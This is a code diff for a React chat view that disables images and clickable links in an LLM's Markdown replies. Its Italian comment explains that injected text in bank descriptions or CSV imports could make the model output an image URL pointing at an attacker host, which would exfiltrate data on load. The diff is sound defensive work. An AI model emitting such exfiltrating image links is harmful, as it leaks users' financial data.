@@ -1,4 +1,4 @@
-import { useEffect, useRef, useState } from 'react';
+import { useEffect, useRef, useState, type ReactNode } from 'react';
 import { useMutation, useQuery, useQueryClient } from '@tanstack/react-query';
 import ReactMarkdown from 'react-markdown';
 import { Plus, Send, Trash2, MessageSquare } from 'lucide-react';
@@ -253,6 +253,18 @@ function ThinkingBubble() {
   );
 }
 
+/**
+ * Hardening del Markdown della risposta LLM: il modello può aver letto testo
+ * non fidato (causali bancarie, descrizioni importate da CSV), quindi immagini
+ * e link vengono neutralizzati — un `![](https://attaccante/?dati)` renderizzato
+ * esfiltrerebbe dati al solo caricamento, e un link cliccabile è phishing.
+ * Le immagini spariscono, i link restano come testo inerte.
+ */
+const MARKDOWN_COMPONENTS = {
+  img: () => null,
+  a: ({ children }: { children?: ReactNode }) => <span className="underline">{children}</span>,
+};
+
 function MessageBubble({ message, streaming }: { message: ChatMessage; streaming?: boolean }) {
   const isUser = message.role === 'user';
   return (
@@ -269,7 +281,7 @@ function MessageBubble({ message, streaming }: { message: ChatMessage; streaming
           <p className="whitespace-pre-wrap">{message.content}</p>
         ) : (
           <div className="prose prose-sm dark:prose-invert max-w-none">
-            <ReactMarkdown>{message.content}</ReactMarkdown>
+            <ReactMarkdown components={MARKDOWN_COMPONENTS}>{message.content}</ReactMarkdown>
             {streaming && <span className="inline-block animate-pulse">▋</span>}
           </div>
         )}
